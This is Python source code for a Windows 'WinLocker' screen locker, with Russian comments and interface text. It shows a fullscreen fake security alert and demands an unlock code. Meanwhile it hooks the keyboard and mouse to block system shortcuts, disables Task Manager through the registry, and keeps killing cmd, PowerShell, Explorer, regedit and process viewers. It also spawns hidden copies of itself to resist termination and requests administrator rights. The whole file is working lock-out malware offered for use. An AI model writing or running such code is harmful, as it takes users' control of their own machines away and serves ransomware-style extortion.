import tkinter as tk
from tkinter import messagebox
import sys
import os
import subprocess
import threading
import time
import hashlib
import ctypes
from ctypes import wintypes
import win32con
import win32api
import win32gui
import win32process

# Расширенная блокировка клавиш
def block_keys():
    def low_level_keyboard_handler(nCode, wParam, lParam):
        if nCode == 0:
            key_data = ctypes.cast(lParam, ctypes.POINTER(KeyBoardData)).contents
            
            # Блокируемые клавиши и комбинации
            blocked_keys = [
                win32con.VK_LWIN,      # Левая клавиша Win
                win32con.VK_RWIN,      # Правая клавиша Win
                win32con.VK_TAB,       # Tab
                win32con.VK_ESCAPE,    # Escape
                win32con.VK_F4,        # F4
                win32con.VK_F1,        # F1
                win32con.VK_F2,        # F2  
                win32con.VK_F3,        # F3
                win32con.VK_F5,        # F5
                win32con.VK_F6,        # F6
                win32con.VK_F7,        # F7
                win32con.VK_F8,        # F8
                win32con.VK_F9,        # F9
                win32con.VK_F10,       # F10
                win32con.VK_F11,       # F11
                win32con.VK_F12,       # F12
                win32con.VK_DELETE,    # Delete
                win32con.VK_APPS       # Menu key
            ]
            
            # Блокируем одиночные клавиши Win
            if key_data.vkCode in [win32con.VK_LWIN, win32con.VK_RWIN]:
                return 1
            
            # Блокируем комбинации с Alt
            if win32api.GetAsyncKeyState(win32con.VK_MENU):
                if key_data.vkCode in [win32con.VK_TAB, win32con.VK_F4, win32con.VK_ESCAPE]:
                    return 1
            
            # Блокируем комбинации с Ctrl
            if win32api.GetAsyncKeyState(win32con.VK_CONTROL):
                if key_data.vkCode in [win32con.VK_ESCAPE, win32con.VK_DELETE]:
                    return 1
                # Ctrl+Shift+Esc - диспетчер задач
                if key_data.vkCode == win32con.VK_ESCAPE and win32api.GetAsyncKeyState(win32con.VK_SHIFT):
                    return 1
            
            # Блокируем комбинации с Win
            if win32api.GetAsyncKeyState(win32con.VK_LWIN) or win32api.GetAsyncKeyState(win32con.VK_RWIN):
                # Win+D, Win+E, Win+L, Win+R, Win+X, Win+Tab, Win+Break и т.д.
                if key_data.vkCode in [ord('D'), ord('E'), ord('L'), ord('R'), ord('X'), 
                                      win32con.VK_TAB, win32con.VK_PAUSE]:
                    return 1
            
            # Блокируем Alt+Space (меню окна)
            if key_data.vkCode == win32con.VK_SPACE and win32api.GetAsyncKeyState(win32con.VK_MENU):
                return 1
            
            # Блокируем Ctrl+Alt+Delete
            if (win32api.GetAsyncKeyState(win32con.VK_CONTROL) and 
                win32api.GetAsyncKeyState(win32con.VK_MENU) and 
                key_data.vkCode == win32con.VK_DELETE):
                return 1
                
        return ctypes.windll.user32.CallNextHookEx(keyboard_hook, nCode, wParam, lParam)

    class KeyBoardData(ctypes.Structure):
        _fields_ = [
            ("vkCode", wintypes.DWORD),
            ("scanCode", wintypes.DWORD),
            ("flags", wintypes.DWORD),
            ("time", wintypes.DWORD),
            ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
        ]

    keyboard_hook = ctypes.windll.user32.SetWindowsHookExA(
        win32con.WH_KEYBOARD_LL,
        ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int)(low_level_keyboard_handler),
        ctypes.windll.kernel32.GetModuleHandleW(None),
        0
    )
    
    return keyboard_hook

# Блокировка мыши (дополнительная защита)
def block_mouse():
    def low_level_mouse_handler(nCode, wParam, lParam):
        # Блокируем правую кнопку мыши (контекстное меню)
        if wParam == win32con.WM_RBUTTONDOWN:
            return 1
        return ctypes.windll.user32.CallNextHookEx(mouse_hook, nCode, wParam, lParam)
    
    mouse_hook = ctypes.windll.user32.SetWindowsHookExA(
        win32con.WH_MOUSE_LL,
        ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))(low_level_mouse_handler),
        ctypes.windll.kernel32.GetModuleHandleW(None),
        0
    )
    return mouse_hook

# Отключение диспетчера задач через реестр
def disable_task_manager():
    try:
        # Временно отключаем диспетчер задач
        subprocess.run(
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
            shell=True, capture_output=True
        )
    except:
        pass

# Восстановление диспетчера задач
def enable_task_manager():
    try:
        subprocess.run(
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f',
            shell=True, capture_output=True
        )
    except:
        pass

# Защита от завершения процесса
def protect_process():
    # Устанавливаем высокий приоритет
    try:
        pid = win32api.GetCurrentProcessId()
        handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
        win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
    except: 
        pass

    # Создаем скрытые дубликаты процесса
    def create_guard():
        while True:
            time.sleep(3)
            try:
                processes = subprocess.check_output('tasklist /fi "imagename eq python.exe"', shell=True).decode()
                if processes.count('python.exe') < 3:  # Держим 3 копии
                    subprocess.Popen([sys.executable, __file__], 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
            except: 
                pass
    
    threading.Thread(target=create_guard, daemon=True).start()

# Пароль (можно изменить на любой числовой)
PASSWORD = "595959"
USE_HASH = False  # Установите False для использования числового пароля

class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.keyboard_hook = None
        self.mouse_hook = None
        self.setup_ui()
        self.protect_system()
        self.failed_attempts = 0
        self.lock_time = None
        
    def setup_ui(self):
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='#0c0c0c', cursor='none')
        
        # Блокируем все системные клавиши в интерфейсе
        self.root.bind_all('<Key>', self.on_key_press)
        self.root.bind_all('<Button>', self.on_mouse_click)
        
        # Градиентный фон
        self.create_gradient_background()
        
        # Блокируем закрытие через Alt+F4 и другие способы
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.root.bind('<Escape>', self.do_nothing)
        self.root.bind('<Alt-F4>', self.do_nothing)
        self.root.bind('<Control-F4>', self.do_nothing)
        
        # Главный контейнер
        main_container = tk.Frame(self.root, bg='#1a1a1a', bd=2, relief='raised')
        main_container.place(relx=0.5, rely=0.5, anchor='center', width=400, height=350)
        
        # Заголовок с иконкой
        header_frame = tk.Frame(main_container, bg='#b30000', height=60)
        header_frame.pack(fill='x', padx=2, pady=2)
        header_frame.pack_propagate(False)
        
        tk.Label(header_frame, text="🚫 СИСТЕМА ЗАБЛОКИРОВАНА", 
                fg='white', bg='#b30000', font=('Arial', 16, 'bold')).pack(expand=True)
        
        # Контент
        content_frame = tk.Frame(main_container, bg='#1a1a1a')
        content_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        # Предупреждение
        warning_text = "⚠️ Несанкционированный доступ обнаружен!\nВведите код безопасности для разблокировки системы."
        tk.Label(content_frame, text=warning_text, 
                fg='#ff6b6b', bg='#1a1a1a', font=('Arial', 10), 
                justify='center', wraplength=350).pack(pady=(0, 20))
        
        # Поле ввода с стилем
        input_frame = tk.Frame(content_frame, bg='#1a1a1a')
        input_frame.pack(pady=10)
        
        tk.Label(input_frame, text="Код разблокировки:", 
                fg='#cccccc', bg='#1a1a1a', font=('Arial', 11)).pack(anchor='w')
        
        self.code_entry = tk.Entry(input_frame, show="•", font=('Arial', 14), 
                                  width=15, bg='#2d2d2d', fg='white', 
                                  insertbackground='white', relief='solid', bd=1)
        self.code_entry.pack(pady=5)
        self.code_entry.bind('<Return>', self.check_code)
        self.code_entry.focus()
        
        # Кнопка разблокировки
        unlock_btn = tk.Button(content_frame, text="🔓 РАЗБЛОКИРОВАТЬ", 
                              command=self.check_code, 
                              font=('Arial', 11, 'bold'),
                              bg='#007acc', fg='white',
                              activebackground='#005a9e',
                              activeforeground='white',
                              relief='raised',
                              bd=2,
                              padx=20,
                              pady=8)
        unlock_btn.pack(pady=15)
        
        # Счетчик попыток
        self.attempts_label = tk.Label(content_frame, text="Попыток: 0/5", 
                                      fg='#888888', bg='#1a1a1a', font=('Arial', 9))
        self.attempts_label.pack()
        
        # Таймер блокировки
        self.timer_label = tk.Label(content_frame, text="", 
                                   fg='#ff4444', bg='#1a1a1a', font=('Arial', 9, 'bold'))
        self.timer_label.pack()
        
        # Анимация мигания
        self.blink_header(header_frame)
        
    def on_key_press(self, event):
        # Блокируем системные клавиши в интерфейсе
        if event.keysym in ['Escape', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12']:
            return "break"
        if event.state & 0x0004 and event.keysym in ['d', 'e', 'l', 'r', 'x', 'Tab']:  # Ctrl+...
            return "break"
        return True
    
    def on_mouse_click(self, event):
        # Блокируем правую кнопку мыши
        if event.num == 3:  # Правая кнопка
            return "break"
        return True
        
    def create_gradient_background(self):
        # Создаем градиентный фон
        self.bg_canvas = tk.Canvas(self.root, bg='#0c0c0c', highlightthickness=0)
        self.bg_canvas.place(x=0, y=0, relwidth=1, relheight=1)
        
        width = self.root.winfo_screenwidth()
        height = self.root.winfo_screenheight()
        
        # Рисуем радиальный градиент
        center_x, center_y = width // 2, height // 2
        max_radius = int((width ** 2 + height ** 2) ** 0.5)
        
        colors = ['#0c0c0c', '#1a1a1a', '#2d2d2d']
        for i, color in enumerate(colors):
            radius = max_radius * (i + 1) // len(colors)
            self.bg_canvas.create_oval(center_x - radius, center_y - radius,
                                      center_x + radius, center_y + radius,
                                      fill=color, outline='')
        
        # Добавляем сетку
        for x in range(0, width, 50):
            self.bg_canvas.create_line(x, 0, x, height, fill='#1a1a1a', width=1)
        for y in range(0, height, 50):
            self.bg_canvas.create_line(0, y, width, y, fill='#1a1a1a', width=1)
    
    def blink_header(self, header):
        def blink():
            colors = ['#b30000', '#ff0000', '#cc0000']
            current = 0
            while True:
                try:
                    header.configure(bg=colors[current])
                    current = (current + 1) % len(colors)
                    time.sleep(0.8)
                except:
                    break
        threading.Thread(target=blink, daemon=True).start()
    
    def update_timer(self):
        if self.lock_time:
            remaining = max(0, 300 - (time.time() - self.lock_time))
            if remaining > 0:
                minutes = int(remaining // 60)
                seconds = int(remaining % 60)
                self.timer_label.config(text=f"Система заблокирована на {minutes:02d}:{seconds:02d}")
                self.root.after(1000, self.update_timer)
            else:
                self.lock_time = None
                self.timer_label.config(text="")
                self.code_entry.config(state='normal')
                self.failed_attempts = 0
                self.attempts_label.config(text="Попыток: 0/5")
        else:
            self.timer_label.config(text="")
    
    def protect_system(self):
        # Отключаем диспетчер задач
        disable_task_manager()
        
        # Блокируем диспетчер задач через taskkill
        try:
            subprocess.run('taskkill /f /im taskmgr.exe', shell=True, capture_output=True)
        except: 
            pass
        
        # Мониторим и убиваем опасные процессы
        threading.Thread(target=self.monitor_processes, daemon=True).start()
        
    def monitor_processes(self):
        blocked_processes = [
            'taskmgr.exe', 'cmd.exe', 'powershell.exe', 
            'regedit.exe', 'msconfig.exe', 'explorer.exe',
            'processhacker.exe', 'procexp.exe', 'procexp64.exe'
        ]
        
        while True:
            try:
                output = subprocess.check_output('tasklist', shell=True).decode()
                for process in blocked_processes:
                    if process.lower() in output.lower():
                        subprocess.run(f'taskkill /f /im {process}', shell=True, capture_output=True)
            except: 
                pass
            time.sleep(1)
    
    def check_code(self, event=None):
        if self.lock_time:
            messagebox.showwarning("Система заблокирована", 
                                 "Подождите окончания времени блокировки!")
            return
        
        input_code = self.code_entry.get()
        
        if USE_HASH:
            # Использование хэша
            input_hash = hashlib.sha256(input_code.encode()).hexdigest()
            correct_hash = hashlib.sha256(PASSWORD.encode()).hexdigest()
            is_correct = input_hash == correct_hash
        else:
            # Использование числового пароля
            is_correct = input_code == PASSWORD
        
        if is_correct:
            self.unlock_system()
        else:
            self.failed_attempts += 1
            self.attempts_label.config(text=f"Попыток: {self.failed_attempts}/5")
            
            if self.failed_attempts >= 5:
                self.lock_time = time.time()
                self.code_entry.config(state='disabled')
                self.update_timer()
                messagebox.showerror("Доступ заблокирован!", 
                                   "Слишком много неудачных попыток!\nСистема заблокирована на 5 минут.")
            else:
                messagebox.showerror("Ошибка", "Неверный код доступа!")
                self.code_entry.delete(0, tk.END)
    
    def unlock_system(self):
        # Восстанавливаем систему
        try:
            enable_task_manager()
            
            # Убираем хуки
            if self.keyboard_hook:
                ctypes.windll.user32.UnhookWindowsHookEx(self.keyboard_hook)
            if self.mouse_hook:
                ctypes.windll.user32.UnhookWindowsHookEx(self.mouse_hook)
                
            self.root.quit()
            self.root.destroy()
        except: 
            os._exit(0)
    
    def do_nothing(self, event=None):
        return "break"
    
    def run(self):
        # Запускаем защиту процесса
        protect_process()
        
        # Запускаем блокировку клавиш и мыши
        self.keyboard_hook = block_keys()
        self.mouse_hook = block_mouse()
        
        self.root.mainloop()

if __name__ == "__main__":
    # Проверяем права администратора
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            app = WinLocker()
            app.run()
        else:
            # Перезапускаем с правами администратора
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    except:
        # Запускаем без прав администратора (с ограниченной функциональностью)
        app = WinLocker()
        app.run()